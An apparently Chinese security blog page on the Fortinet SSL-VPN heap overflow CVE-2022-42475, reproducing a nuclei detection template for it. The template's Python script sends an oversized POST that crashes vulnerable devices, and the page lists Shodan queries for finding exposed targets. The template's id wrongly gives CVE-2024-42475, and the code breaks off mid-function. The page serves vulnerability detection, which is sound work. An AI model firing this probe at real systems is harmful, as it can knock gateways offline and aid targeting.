@@ -1,0 +1,667 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lianccc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞信息漏洞名称： Fortinet SSL-VPN 堆缓冲区溢出漏洞 漏洞编号：  CVE： CVE-2022-42475  漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： Fortinet SSL-VPN中存在一个堆缓冲区溢出漏洞（CWE-122），影响FortiOS（版本7.2.0至7.2.2、7.0.0至7.0.8、6.4.0至6.4.10、6.2.0至6.2.11、6.0.15及更">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fortinet SSL-VPN 堆缓冲区溢出漏洞">
+<meta property="og:url" content="http://example.com/2025/06/11/github_1249466416/index.html">
+<meta property="og:site_name" content="liancc&#39; infos blog">
+<meta property="og:description" content="漏洞信息漏洞名称： Fortinet SSL-VPN 堆缓冲区溢出漏洞 漏洞编号：  CVE： CVE-2022-42475  漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： Fortinet SSL-VPN中存在一个堆缓冲区溢出漏洞（CWE-122），影响FortiOS（版本7.2.0至7.2.2、7.0.0至7.0.8、6.4.0至6.4.10、6.2.0至6.2.11、6.0.15及更">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-11T06:46:37.801Z">
+<meta property="article:modified_time" content="2025-06-11T06:46:37.799Z">
+<meta property="article:author" content="lianccc">
+<meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Fortinet SSL-VPN 堆缓冲区溢出漏洞 - liancc&#39; infos blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="liancc' infos blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Craw Info</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fortinet SSL-VPN 堆缓冲区溢出漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-11 06:46" pubdate>
+          2025年6月11日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          943 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Fortinet SSL-VPN 堆缓冲区溢出漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Fortinet SSL-VPN 堆缓冲区溢出漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2022-42475</li>
+</ul>
+<p><strong>漏洞类型：</strong> 缓冲区溢出</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> Fortinet SSL-VPN中存在一个堆缓冲区溢出漏洞（CWE-122），影响FortiOS（版本7.2.0至7.2.2、7.0.0至7.0.8、6.4.0至6.4.10、6.2.0至6.2.11、6.0.15及更早版本）和FortiProxy（版本7.2.0至7.2.1、7.0.7及更早版本）。远程未认证攻击者可通过特制请求执行任意代码或命令。</p>
+<p><strong>产品厂商：</strong> fortinet</p>
+<p><strong>产品名称：</strong> FortiOS, FortiProxy</p>
+<p><strong>影响版本：</strong> FortiOS 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and earlier; FortiProxy 7.2.0 through 7.2.1, 7.0.7 and earlier</p>
+<p><strong>搜索语法：</strong> port:10443 http.favicon.hash:945408572, cpe:”cpe:2.3:o:fortinet:fortios”, http.html:”&#x2F;remote&#x2F;login” “xxxxxxxx”</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/8dabb9389d1a48d35e6e37c5e7b913d5af2aef37/code%2Fcves%2F2022%2FCVE-2022-42475.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/8dabb9389d1a48d35e6e37c5e7b913d5af2aef37/code%2Fcves%2F2022%2FCVE-2022-42475.yaml</a></p>
+<p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs swift"><br>id: <span class="hljs-type">CVE</span><span class="hljs-operator">-</span><span class="hljs-number">2024</span><span class="hljs-operator">-</span><span class="hljs-number">42475</span><br><br>info:<br>  name: <span class="hljs-type">Heap</span><span class="hljs-operator">-</span>based <span class="hljs-type">Buffer</span> <span class="hljs-type">Overflow</span> <span class="hljs-keyword">in</span> <span class="hljs-type">Fortinet</span> <span class="hljs-type">SSL</span><span class="hljs-operator">-</span><span class="hljs-type">VPN</span><br>  author: 0xhaggis, pszyszkowski<br>  severity: critical<br>  description: <span class="hljs-operator">|</span><br>    <span class="hljs-type">A</span> heap<span class="hljs-operator">-</span>based buffer overflow vulnerability [<span class="hljs-type">CWE</span><span class="hljs-operator">-</span><span class="hljs-number">122</span>] <span class="hljs-keyword">in</span> <span class="hljs-type">FortiOS</span> <span class="hljs-type">SSL</span><span class="hljs-operator">-</span><span class="hljs-type">VPN</span> (versions <span class="hljs-number">7.2</span>.<span class="hljs-number">0</span> through <span class="hljs-number">7.2</span>.<span class="hljs-number">2</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">7.0</span>.<span class="hljs-number">8</span>, <span class="hljs-number">6.4</span>.<span class="hljs-number">0</span> through <span class="hljs-number">6.4</span>.<span class="hljs-number">10</span>, <span class="hljs-number">6.2</span>.<span class="hljs-number">0</span> through <span class="hljs-number">6.2</span>.<span class="hljs-number">11</span>, <span class="hljs-number">6.0</span>.<span class="hljs-number">15</span> and earlier) and <span class="hljs-type">FortiProxy</span> <span class="hljs-type">SSL</span><span class="hljs-operator">-</span><span class="hljs-type">VPN</span> (versions <span class="hljs-number">7.2</span>.<span class="hljs-number">0</span> through <span class="hljs-number">7.2</span>.<span class="hljs-number">1</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">7</span> and earlier) may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.<br>  remediation: <span class="hljs-operator">|</span><br>    <span class="hljs-type">Fixed</span> <span class="hljs-keyword">in</span>:<br>    <span class="hljs-type">FortiOS</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-number">7.2</span>.<span class="hljs-number">3</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">9</span>, <span class="hljs-number">6.4</span>.<span class="hljs-number">11</span>, <span class="hljs-number">6.2</span>.<span class="hljs-number">12</span>, <span class="hljs-number">6.0</span>.<span class="hljs-number">16</span><br>    <span class="hljs-type">FortiOS</span><span class="hljs-operator">-</span>6K7K <span class="hljs-operator">&gt;=</span> <span class="hljs-number">7.0</span>.<span class="hljs-number">8</span>, <span class="hljs-number">6.4</span>.<span class="hljs-number">10</span>, <span class="hljs-number">6.2</span>.<span class="hljs-number">12</span>, <span class="hljs-number">6.0</span>.<span class="hljs-number">15</span><br>    <span class="hljs-type">FortiProxy</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-number">7.2</span>.<span class="hljs-number">2</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">8</span>, <span class="hljs-number">2.0</span>.<span class="hljs-number">12</span><br>  reference:<br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/0xhaggis/CVE-2022-42475</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/CKevens/CVE-2022-42475-RCE-POC</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/Amir-hy/cve-2022-42475</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/Mustafa1986/cve-2022-42475-Fortinet</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/natceil/cve-2022-42475</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//github.com/scrt/cve-2022-42475</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//fortiguard.com/psirt/FG-IR-22-398</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//labs.watchtowr.com/fortinet-no-more-funny-titles-cve-2022-42475/</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//bishopfox.com/blog/exploit-cve-2022-42475</span><br>  classification:<br>    cvss<span class="hljs-operator">-</span>metrics: <span class="hljs-type">CVSS</span>:<span class="hljs-number">3.1</span><span class="hljs-regexp">/AV:N/</span><span class="hljs-type">AC</span>:<span class="hljs-type">L</span><span class="hljs-regexp">/PR:N/</span><span class="hljs-type">UI</span>:<span class="hljs-type">N</span><span class="hljs-regexp">/S:U/</span><span class="hljs-type">C</span>:<span class="hljs-type">H</span><span class="hljs-regexp">/I:H/</span><span class="hljs-type">A</span>:<span class="hljs-type">H</span><br>    cvss<span class="hljs-operator">-</span>score: <span class="hljs-number">9.8</span><br>    cve<span class="hljs-operator">-</span>id: <span class="hljs-type">CVE</span><span class="hljs-operator">-</span><span class="hljs-number">2024</span><span class="hljs-operator">-</span><span class="hljs-number">42475</span><br>    cwe<span class="hljs-operator">-</span>id: <span class="hljs-type">CWE</span><span class="hljs-operator">-</span><span class="hljs-number">122</span><br>  metadata:<br>    max<span class="hljs-operator">-</span>request: <span class="hljs-number">1</span><br>    vendor: fortinet<br>    product: fortios<br>    shodan<span class="hljs-operator">-</span>query:<br>      <span class="hljs-operator">-</span> port:<span class="hljs-number">10443</span> http.favicon.hash:<span class="hljs-number">945408572</span><br>      <span class="hljs-operator">-</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:fortinet:fortios&quot;</span><br>      <span class="hljs-operator">-</span> http.html:<span class="hljs-string">&quot;/remote/login&quot;</span> <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br>  tags: cve,cve2024,ssl<span class="hljs-operator">-</span>vpn,vpn,fortios,fortigate<br><br>code:<br>  <span class="hljs-operator">-</span> engine:<br>      <span class="hljs-operator">-</span> py<br>      <span class="hljs-operator">-</span> python3<br>    source: <span class="hljs-operator">|</span><br>      <span class="hljs-keyword">import</span> sys, os, time, socket, ssl<br>      <span class="hljs-type">PADDING</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0x4141414141414141</span><br>      <span class="hljs-type">PADDING_LEN</span>    <span class="hljs-operator">=</span> <span class="hljs-number">1024</span><span class="hljs-operator">*</span><span class="hljs-number">12</span>     <br>      <span class="hljs-type">CONTENT_LENGTH</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;4294967297&quot;</span><br>      <span class="hljs-keyword">class</span> <span class="hljs-title class_">SSLVPNExploit</span>:<br>        def __init__(<span class="hljs-keyword">self</span>, host, port):<br>          <span class="hljs-keyword">self</span>.host = host<br>          <span class="hljs-keyword">self</span>.port = port<br>        def connect(<span class="hljs-keyword">self</span>):<br>          tries = 1<br>          <span class="hljs-keyword">if</span> os.getenv(&quot;<span class="hljs-title class_ inherited__">Scheme</span>&quot;) == &quot;https&quot;:<br>            use<span class="hljs-title class_ inherited__">SSL</span> = <span class="hljs-title class_ inherited__">True</span><br>            print(&quot;[+] <span class="hljs-title class_ inherited__">Using</span> <span class="hljs-title class_ inherited__">SSL</span>/<span class="hljs-title class_ inherited__">TLS</span>&quot;)<br>          <span class="hljs-keyword">else</span>:<br>            use<span class="hljs-title class_ inherited__">SSL</span> = <span class="hljs-title class_ inherited__">False</span><br>            print(&quot;[+] <span class="hljs-title class_ inherited__">Unencrypted</span> connection&quot;)<br>          <span class="hljs-keyword">while</span> tries &lt;= 6:<br>            <span class="hljs-keyword">try</span>:<br>              print(&quot;[+] <span class="hljs-title class_ inherited__">Connecting</span> to %s [ attempt %d of 6 ]                                \r&quot; % (<span class="hljs-keyword">self</span>.host, tries), end=&#x27;\n&#x27;)<br>              <span class="hljs-keyword">self</span>.cleartext_socket = socket.socket(socket.<span class="hljs-title class_ inherited__">AF_INET</span>, socket.<span class="hljs-title class_ inherited__">SOCK_STREAM</span>)<br>              <span class="hljs-keyword">if</span> use<span class="hljs-title class_ inherited__">SSL</span> == <span class="hljs-title class_ inherited__">True</span>:<br>                ctx = ssl._create_unverified_context()<br>                <span class="hljs-keyword">self</span>.socket = ctx.wrap_socket(<span class="hljs-keyword">self</span>.cleartext_socket)<br>              <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">self</span>.socket = <span class="hljs-keyword">self</span>.cleartext_socket<br>              <span class="hljs-keyword">self</span>.socket.settimeout(2.0)<br>              <span class="hljs-keyword">self</span>.socket.connect((<span class="hljs-keyword">self</span>.host, <span class="hljs-keyword">self</span>.port))<br><br>              <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.socket<br>            except socket.timeout <span class="hljs-keyword">as</span> e:<br>              tries += 1<br>              print(&quot;<span class="hljs-title class_ inherited__">Connection</span> timeout!&quot;)<br>              <span class="hljs-keyword">continue</span><br>            except <span class="hljs-title class_ inherited__">Exception</span> <span class="hljs-keyword">as</span> e:<br>              print(&quot;<span class="hljs-title class_ inherited__">Unknown</span> error!&quot;)<br>              print(e)<br>              <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">None</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">None</span><br>        def check_by_get(<span class="hljs-keyword">self</span>):<br>          get_req = bytearray(b&quot;&quot;)<br>          get_req += b&quot;<span class="hljs-title class_ inherited__">GET</span> /remote/login <span class="hljs-title class_ inherited__">HTTP</span>/1.1\r\n<span class="hljs-title class_ inherited__">Host</span>: &quot; + <span class="hljs-keyword">self</span>.host.encode() + b&quot;:&quot; + str(<span class="hljs-keyword">self</span>.port).encode() + b&quot;\r\n<span class="hljs-title class_ inherited__">User</span>-<span class="hljs-title class_ inherited__">Agent</span>: <span class="hljs-title class_ inherited__">AAAAAAAAAAAAAAAA</span>\r\n<span class="hljs-title class_ inherited__">Content</span>-<span class="hljs-title class_ inherited__">Type</span>: application/x-www-form-urlencoded\r\n<span class="hljs-title class_ inherited__">Accept</span>: */*\r\n\r\n&quot;        <br><br>          print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Sending</span> <span class="hljs-title class_ inherited__">GET</span> first&quot;)<br>          <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.connect() == <span class="hljs-title class_ inherited__">None</span>:<br>            print(&quot;[!] <span class="hljs-title class_ inherited__">Error</span> connecting to target&quot;)<br>            exit(1)<br>          <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">self</span>.socket.sendall(get_req)<br><br>            <span class="hljs-keyword">self</span>.socket.settimeout(10) <br>            get_buf = <span class="hljs-keyword">self</span>.socket.recv(1048576)<br>            <br>            <span class="hljs-keyword">if</span> len(get_buf) == 0:<br>              print(&quot;<span class="hljs-title class_ inherited__">Error</span> <span class="hljs-keyword">while</span> sending <span class="hljs-title class_ inherited__">GET</span>. <span class="hljs-title class_ inherited__">Protocol</span> mismatch?&quot;)<br>              <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">None</span><br>            <span class="hljs-keyword">self</span>.socket.close()<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">True</span><br>          except socket.timeout <span class="hljs-keyword">as</span> e:<br>            print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Target</span> waited <span class="hljs-keyword">for</span> more data.&quot;)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">False</span><br>          except <span class="hljs-title class_ inherited__">Exception</span> <span class="hljs-keyword">as</span> e:<br>            print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Target</span> dropped the connection during test <span class="hljs-title class_ inherited__">GET</span>, which indicates a communication error!&quot;)<br>            print(e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">None</span><br>        def is_vulnerable(<span class="hljs-keyword">self</span>):<br>          req = bytearray(b&quot;&quot;)<br>          req += b&quot;<span class="hljs-title class_ inherited__">POST</span> /remote/login <span class="hljs-title class_ inherited__">HTTP</span>/1.1\r\n<span class="hljs-title class_ inherited__">Host</span>: &quot; + <span class="hljs-keyword">self</span>.host.encode() + b&quot;:&quot; + str(<span class="hljs-keyword">self</span>.port).encode() + b&quot;\r\n<span class="hljs-title class_ inherited__">Content</span>-<span class="hljs-title class_ inherited__">Length</span>: &quot; + <span class="hljs-title class_ inherited__">CONTENT_LENGTH</span> + b&quot;\r\n<span class="hljs-title class_ inherited__">User</span>-<span class="hljs-title class_ inherited__">Agent</span>: <span class="hljs-title class_ inherited__">AAAAAAAAAAAAAAAA</span>\r\n<span class="hljs-title class_ inherited__">Content</span>-<span class="hljs-title class_ inherited__">Type</span>: application/x-www-form-urlencoded\r\n<span class="hljs-title class_ inherited__">Accept</span>: */*\r\n\r\n&quot;        <br>          req += b&quot;<span class="hljs-title class_ inherited__">AAAAAAAA</span>&quot;*(<span class="hljs-title class_ inherited__">PADDING_LEN</span>)<br><br>          print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Testing</span> to see <span class="hljs-keyword">if</span> target <span class="hljs-keyword">is</span> vulnerable (may take 10 seconds)&quot;)<br>          <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.connect() == <span class="hljs-title class_ inherited__">None</span>:<br>            print(&quot;[!] <span class="hljs-title class_ inherited__">Error</span> connecting to target&quot;)<br>            exit(1)<br>          <span class="hljs-keyword">try</span>:            <br>            # <span class="hljs-title class_ inherited__">Send</span> the payload. <span class="hljs-title class_ inherited__">Vuln</span> instances will crash, severing the connection and <br>            # causing an exception to be thrown here.<br>            <span class="hljs-keyword">self</span>.socket.sendall(req)<br>            <br>            # <span class="hljs-title class_ inherited__">If</span> this read succeeds then the target <span class="hljs-keyword">is</span> probably not vulnerable.<br>            # <span class="hljs-title class_ inherited__">If</span> it times out, then it&#x27;s also probably not vulnerable.<br>            <span class="hljs-keyword">self</span>.socket.settimeout(10) <br>            buf = <span class="hljs-keyword">self</span>.socket.recv(1048576)<br>            <br>            # <span class="hljs-title class_ inherited__">If</span> the remote end disconnects without an <span class="hljs-title class_ inherited__">HTTP</span> response then it&#x27;s vulnerable.<br>            <span class="hljs-keyword">if</span> len(buf) == 0:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">True</span><br><br>            # <span class="hljs-title class_ inherited__">Check</span> to see <span class="hljs-keyword">if</span> it has the vendor patch applied <br>            <span class="hljs-keyword">if</span> buf.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;).__contains__(&quot;<span class="hljs-title class_ inherited__">HTTP</span>/1.1 413 <span class="hljs-title class_ inherited__">Request</span> <span class="hljs-title class_ inherited__">Entity</span> <span class="hljs-title class_ inherited__">Too</span> <span class="hljs-title class_ inherited__">Large</span>&quot;):<br>                print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Target</span> <span class="hljs-keyword">is</span> patched.&quot;)<br>                <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">False</span> # 100% confidence that it&#x27;s not vulnerable.<br><br>            # <span class="hljs-title class_ inherited__">Ok</span>, something weird and unexpected happened.<br>            print(&quot;[&gt;] <span class="hljs-title class_ inherited__">An</span> unexpected response (%d bytes) was recieved:&quot; % len(buf))<br>            print(&quot;----- <span class="hljs-title class_ inherited__">BEGIN</span> <span class="hljs-title class_ inherited__">RESPONSE</span> -----&quot;)<br>            print(buf.decode(&quot;utf-8&quot;, errors=&quot;replace&quot;).replace(&quot;\\r\\n&quot;, &quot;\n&quot;))<br>            print(&quot;----- <span class="hljs-title class_ inherited__">END</span> <span class="hljs-title class_ inherited__">RESPONSE</span> -----&quot;)<br>            <span class="hljs-keyword">self</span>.socket.close()<br>  